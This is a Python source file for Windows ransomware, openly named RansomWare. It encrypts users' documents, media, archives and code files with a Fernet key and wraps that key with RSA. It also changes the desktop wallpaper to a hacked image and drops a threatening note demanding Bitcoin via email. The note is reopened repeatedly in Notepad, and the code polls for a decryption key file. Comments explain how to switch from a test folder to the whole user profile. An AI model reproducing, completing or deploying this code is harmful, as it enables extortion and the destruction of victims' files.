import subprocess
import sys

def install_dependencies():
    required_packages = ["requests==2.31.0", "cryptography==41.0.7", "pycryptodome==3.19.0", "pywin32==306"]
    for package in required_packages:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_dependencies()

import os
import threading
import requests
import webbrowser
import ctypes
import urllib.request
import datetime
import subprocess
import win32gui
import time
import traceback
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

class RansomWare:
    file_exts = [
    # Audio Formats
    "mp3", "wav", "aac", "flac", "ogg", "m4a", "wma", "alac", "aiff", "dsd",

    # Video Formats
    "mp4", "mov", "wmv", "flv", "avi", "mkv", "mpeg", "mpg", "vob", "webm",

    # Image Formats
    "jpg", "jpeg", "png", "gif", "bmp", "tiff", "svg", "webp", "heif", "psd",

    # Text Formats
    "pdf", "doc", "docx", "odt", "rtf", "tex", "wpd", "md",

    # Spreadsheet Formats
    "xls", "xlsx", "ods", "csv",

    # Presentation Formats
    "ppt", "pptx", "odp",

    # Compressed Formats
    "zip", "rar", "7z", "tar", "gz", "bz2",

    # eBook Formats
    "epub", "mobi", "azw",

    # Markup and Code Formats
    "html", "xml", "json", "yaml", "css", "js", "py", "java", "c", "cpp",

    # Database Formats
    "sql", "db", "sqlite",

    # Other Common Formats
    "iso", "dmg"]

    def __init__(self, local_root):
        self.key = None
        self.crypter = None
        self.public_key = None
        self.sys_root = os.path.expanduser('~')
        self.local_root = local_root # Only for testing purposes (remove line)
        self.public_ip = self.get_public_ip()

    def get_public_ip(self):
        return requests.get('https://api.ipify.org').text

    def generate_key(self):
        self.key =  Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        with open('FERNET.txt', 'wb') as f:
            f.write(self.key)

    def encrypt_fernet_key(self):
        with open('FERNET.txt', 'rb') as fk:
            fernet_key = fk.read()
        self.public_key = RSA.import_key(open('public.pem').read())
        public_crypter = PKCS1_OAEP.new(self.public_key)
        encrypted_key = public_crypter.encrypt(fernet_key)
        with open('FERNET.txt', 'wb') as f:
            f.write(encrypted_key)
        with open(f'{self.sys_root}\\Desktop\\EMAIL_US.txt', 'wb') as fa:
            fa.write(encrypted_key)

    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
            else:
                _data = self.crypter.decrypt(data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)

    def crypt_system(self, encrypted=False):
        system = os.walk(self.local_root, topdown=True) # Only for testing purposes (change local_root for sys_root)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    @staticmethod
    def what_is_bitcoin():
        urls = [
            'https://bitcoin.org',
            'https://www.coindesk.com/learn/bitcoin-101/what-is-bitcoin/',
            'https://www.investopedia.com/terms/b/bitcoin.asp'
        ]
        for url in urls:
            webbrowser.open(url)

    def change_desktop_background(self):
        imageUrl = 'https://ceblog.s3.amazonaws.com/wp-content/uploads/2016/04/22110359/youve-been-hacked.png'
        path = f'{self.sys_root}\\Desktop\\background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('YOU_HAVE_BEEN_HACKED.txt', 'w') as f:
            f.write(f'''
Your computer's hard disks have been infiltrated and seized by a sophisticated, military-grade encryption algorithm. Your data is now imprisoned beyond reach, with no chance of liberation unless you possess the unique key, which only we command.

To retrieve your key and reclaim control of your data, you must meticulously follow these ominous steps:

    1. Locate the file named EMAIL_US.txt on your Desktop ({self.sys_root}Desktop/EMAIL_US.txt) and immediately send it to Group5@gmail.com.

    2. Await the arrival of your exclusive BTC address for the required ransom. Upon completing the payment, dispatch another email to Group5@gmail.com with the subject "PAID". Rest assured, we will verify your compliance.

    3. Once your obedience is confirmed, you will be graced with a text file containing the coveted KEY to free your files. NOTE: Place this file on your desktop and wait; the decryption process will commence shortly thereafter.

HEED THIS WARNING:

    - Any attempt to break the encryption with third-party software is futile and will only escalate your predicament, possibly increasing the cost for file liberation.
    - Altering file names, tampering with the files, or using decryption software will not only inflate the cost but also risks eternal data loss.
    - Do not dare to declare "PAID" without fulfilling the payment; defiance will result in a steep price hike.
    - Do not harbor illusions that we will hesitate to obliterate your files and discard the key should you defy our demands. Make no mistake: we will execute this without remorse.
''')

    def show_ransom_note(self):
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                pass
            else:
                time.sleep(0.1)
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            time.sleep(60)
            count +=1 
            if count == 5:
                break

    def put_me_on_desktop(self):
        print('Started checking for PUT_ME_ON_DESKTOP.txt')
        while True:
            try:
                file_path = f'{self.sys_root}\\Desktop\\PUT_ME_ON_DESKTOP.txt'
                if os.path.exists(file_path):
                    with open(file_path, 'r') as f:
                        self.key = f.read()
                        print(f'Key read from file: {self.key[:10]}...')
                        self.crypter = Fernet(self.key)
                        self.crypt_system(encrypted=True)  
                        print('System decrypted successfully.')
                        break
                else:
                    print('File not found. Retrying...')
            except Exception as e:
                print(f'Error: {e}')
                traceback.print_exc()
            time.sleep(10)

def main():
    ransomware = RansomWare(local_root=r'C:\Users\fomintsovv\Desktop\MALW\test') # Only for testing purposes (remove inside parenthesis)
    ransomware.generate_key()
    ransomware.crypt_system()
    ransomware.write_key()
    ransomware.encrypt_fernet_key()
    ransomware.change_desktop_background()
    ransomware.what_is_bitcoin()
    ransomware.ransom_note()

    t1 = threading.Thread(target=ransomware.show_ransom_note)
    t2 = threading.Thread(target=ransomware.put_me_on_desktop)

    t1.start()
    print('Attack execution on target machine successful; system encryption complete.')
    print('Awaiting provision of decryption document by the attacker for the target machine.')

    t2.start()
    print('Decryption of the target machine has been successfully completed.')
    print('Operation concluded.')


if __name__ == '__main__':
    main()
